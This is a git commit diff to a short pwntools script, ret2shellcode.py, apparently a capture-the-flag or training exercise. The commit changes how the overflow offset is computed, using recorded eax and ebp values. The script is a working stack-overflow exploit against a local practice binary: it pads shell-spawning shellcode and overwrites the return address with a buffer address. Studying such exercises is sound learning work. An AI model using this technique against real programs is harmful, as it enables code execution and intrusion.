141a56fbf6d03eb6cc5b9c83356458953563a069
zevmre <zevmre@126.com>
2023-04-19 04:04:56 -0400

    ret2shellcode based on registers info

--- ret2shellcode.py
+++ ret2shellcode.py
@@ -1,9 +1,11 @@
 from pwn import *
 
+eax=0xffffcfcc
+ebp=0xffffd038
 buf2_addr=0x0804A080
 shellcode=asm(shellcraft.sh())
 print('shellcode length:%d'%(len(shellcode)))
-offset=0x6c+4
+offset=ebp-eax+4
 shellcode_pad=shellcode+(offset-len(shellcode))*b'A'
 sh=process('./ret2shellcode')
 sh.sendline(shellcode_pad+p32(buf2_addr))
